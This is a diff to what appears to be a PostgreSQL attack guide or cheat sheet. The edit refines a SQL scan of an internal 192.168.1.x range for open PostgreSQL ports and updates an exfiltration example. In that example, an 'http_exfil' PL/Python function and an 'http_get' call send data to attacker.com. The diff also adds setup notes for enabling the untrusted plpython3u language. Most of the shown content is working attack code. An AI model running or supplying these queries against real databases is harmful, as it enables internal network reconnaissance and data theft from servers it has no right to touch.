@@ -241,13 +241,14 @@ FROM unnest(ARRAY[21,22,23,25,80,443,3306,3389,5432,8080]) AS port;
 **Internal Network Discovery:**
 
 ```sql
--- Scan internal IP range for PostgreSQL instances
-SELECT ip, port_scan(ip, 5432) AS pg_status
-FROM (
-    SELECT '192.168.1.' || n AS ip
+-- Scan internal IP range for PostgreSQL instances (using CTE to avoid duplicate calls)
+WITH scan_results AS (
+    SELECT '192.168.1.' || n AS ip,
+           port_scan('192.168.1.' || n, 5432) AS pg_status
     FROM generate_series(1, 254) AS n
-) AS hosts
-WHERE port_scan(ip, 5432) NOT LIKE 'closed%';
+)
+SELECT ip, pg_status FROM scan_results
+WHERE pg_status NOT LIKE 'closed%';
 ```
 
 **SSRF via dblink (Server-Side Request Forgery):**
@@ -280,12 +281,14 @@ Some PostgreSQL installations have HTTP extensions:
 -- If http extension is installed
 SELECT http_get('http://attacker.com/?data=' || (SELECT version()));
 
--- Using plpython if available
+-- Using plpython3u if available (requires: CREATE EXTENSION plpython3u)
 CREATE FUNCTION http_exfil(data text) RETURNS void AS $$
 import urllib.request
 urllib.request.urlopen('http://attacker.com/?d=' + data)
-$$ LANGUAGE plpythonu;
+$$ LANGUAGE plpython3u;
 ```
+
+**Note:** The `plpython3u` extension must be installed on the server (`apt install postgresql-plpython3-XX` or equivalent) and enabled (`CREATE EXTENSION plpython3u`) before creating PL/Python functions. The "u" suffix indicates untrusted language, requiring superuser privileges.
 
 ### Required Setup
 
